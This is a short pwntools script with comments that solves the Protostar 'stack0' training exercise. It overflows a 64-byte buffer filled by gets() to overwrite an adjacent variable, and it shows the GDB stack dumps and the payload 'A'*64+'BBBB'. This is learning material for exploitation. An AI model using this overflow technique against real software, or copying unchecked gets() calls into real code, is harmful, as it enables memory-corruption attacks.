#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *

binary = process("./stack0")
ELF("./stack0")


#Goal : Change the value of the variable "modified".
#Let's look at the source code:

"""
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

"""

#The modified variable is created after a buffer of 64 bytes.
#It's enough to fill the buffer(of 64 bytes) and then to add 1 octect in order to modify the value of the variable.
#
#
#man get : 
#Never use gets().  Because it is impossible to tell without knowing
#the data in advance how many characters gets() will read, and because
#gets() will continue to store characters past the end of the buffer,
#It's extremely dangerous to use.  It has been used to break computer
#security.
#
#
#Try with GDB :
#
#gdb ./stack0
#disass main
#breakpoint * 0x08048411(address after call gets@plt)
#run
#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(64 times)
#x/50xw $esp
#0xffffd240:	0xffffd25c	0xffffd2e4	0x00000000	0x1888f600
#0xffffd250:	0xffffffff	0xffffd4c9	0xf7dc6138	0x41414141
#0xffffd260:	0x41414141	0x41414141	0x41414141	0x41414141
#0xffffd270:	0x41414141	0x41414141	0x41414141	0x41414141
#0xffffd280:	0x41414141	0x41414141	0x41414141	0x41414141
#0xffffd290:	0x41414141	0x41414141	0x41414141	0x00000000
#
#
#We notice our A 64 times, and then we notice 0x00000000 
#which corresponds to the value of the variable modified. 
#
#So let's try to modify this variable, by sending the following 'A' 64 times and 'BBBB'
#
#gdb ./stack0
#breakpoint * 0x08048411(address after call gets@plt)
#run
#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(64 times)+"BBBB"
#x/50xw $esp
#0xffffd240:	0xffffd25c	0xffffd2e4	0x00000000	0x853d3900
#0xffffd250:	0xffffffff	0xffffd4c8	0xf7dc6138	0x41414141
#0xffffd260:	0x41414141	0x41414141	0x41414141	0x41414141
#0xffffd270:	0x41414141	0x41414141	0x41414141	0x41414141
#0xffffd280:	0x41414141	0x41414141	0x41414141	0x41414141
#0xffffd290:	0x41414141	0x41414141	0x41414141	0x42424242
#continue
#you have changed the 'modified' variable

#Exploit with pwntools:
binary.sendline("A"*64+"BBBB")
result = binary.recv(1024)
print result
